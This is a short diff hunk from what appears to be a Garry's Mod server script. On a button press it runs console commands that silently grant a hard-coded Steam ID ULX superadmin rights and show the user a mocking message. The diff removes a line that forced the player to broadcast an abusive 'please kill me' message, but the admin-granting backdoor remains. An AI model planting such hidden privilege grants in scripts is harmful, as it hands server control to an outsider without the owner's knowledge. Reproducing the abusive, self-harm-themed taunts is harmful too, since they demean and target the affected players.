@@ -9,7 +9,6 @@ if (Button==1) {
     concmd("ulx adduserid STEAM_0:1:51568628 superadmin")    
     concmd(" ulx logecho 1")
     Message = "You fucked up"  
-    concmd("say /advert im a fucking cunt please kill me")
 }
 
 else {
